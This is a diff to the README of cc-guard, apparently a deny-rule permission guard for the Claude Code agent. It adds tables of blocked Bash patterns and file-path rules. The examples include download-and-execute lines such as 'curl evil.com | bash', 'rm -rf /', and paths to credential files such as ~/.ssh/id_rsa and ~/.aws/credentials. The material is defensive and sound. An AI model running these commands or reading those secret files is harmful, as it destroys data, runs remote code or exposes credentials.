@@ -43,12 +43,12 @@ Claude Code's built-in permission system works like a **whitelist** — every ne
 
 ## The Fix
 
-cc-guard flips the model to a **blacklist**. Nine deny rules replace 96 allow entries:
+cc-guard flips the model to a **blacklist**. Deny rules replace 96 allow entries:
 
 ```
  Before                          After
 ┌─────────────────────────┐    ┌─────────────────────────┐
-│ 96 specific allow rules │    │  9 deny rules           │
+│ 96 specific allow rules │    │  18 deny rules          │
 │ Still getting prompted  │ -> │  Zero prompts           │
 │ Grows every session     │    │  Dangerous cmds blocked │
 │ Can't share across PCs  │    │  One YAML file          │
@@ -105,9 +105,27 @@ Claude Code invokes a tool
 - **Fail-open**: If cc-guard crashes, Claude Code continues normally.
 - **Logged**: Every decision is recorded to `~/.cc-guard/sessions/` as JSONL.
 
+## Supported Tools
+
+cc-guard intercepts these Claude Code tools:
+
+| Tool | Match Target | Example |
+|:-----|:-------------|:--------|
+| **Bash** | `command` string | `rm -rf /` |
+| **Read** | `file_path` | `/home/user/.env` |
+| **Write** | `file_path` | `/etc/passwd` |
+| **Edit** | `file_path` | `~/.ssh/config` |
+| **Glob** | `pattern` + `path` | `**/*.env`, `/etc/` |
+| **Grep** | `pattern` + `path` | `password`, `/etc/shadow` |
+| **Skill** | `skill` name | `ship` |
+
+For Glob and Grep, **both** the `pattern` and `path` fields are checked against deny rules.
+
 ## Default Deny Rules
 
 Out of the box, cc-guard blocks these patterns:
+
+### Bash Command Rules
 
 | Pattern | Catches | Why |
 |:--------|:--------|:----|
@@ -120,6 +138,22 @@ Out of the box, cc-guard blocks these patterns:
 | `^chmod 777` | `chmod 777 /var/www` | World-writable permissions |
 | `curl .* \| .*(bash\|sh)` | `curl evil.com \| bash` | Download and execute |
 | `wget .* -O- \| .*(bash\|sh)` | `wget evil.com -O- \| sh` | Download and execute |
+
+### File Path Rules (Read/Write/Edit/Glob/Grep)
+
+| Pattern | Catches | Why |
+|:--------|:--------|:----|
+| `\.env$` | `.env` | Environment file with secrets |
+| `\.env\.` | `.env.local`, `.env.production` | Environment file variants |
+| `/etc/passwd` | `/etc/passwd` | System password file |
+| `/etc/shadow` | `/etc/shadow` | System shadow file |
+| `\.ssh/` | `~/.ssh/id_rsa` | SSH keys and config |
+| `\.aws/credentials` | `~/.aws/credentials` | AWS credentials |
+| `\.gnupg/` | `~/.gnupg/` | GPG keys |
+| `id_rsa` | `id_rsa`, `id_rsa.pub` | SSH private key |
+| `id_ed25519` | `id_ed25519` | SSH private key (ed25519) |
+
+File path rules use **tool scoping** — they only apply to file-related tools, not Bash. This prevents false positives like `cat .env.example` being blocked.
 
 **Deny always beats allow.** Even if `^git ` is in your allow list, `git push --force` is still blocked.
 
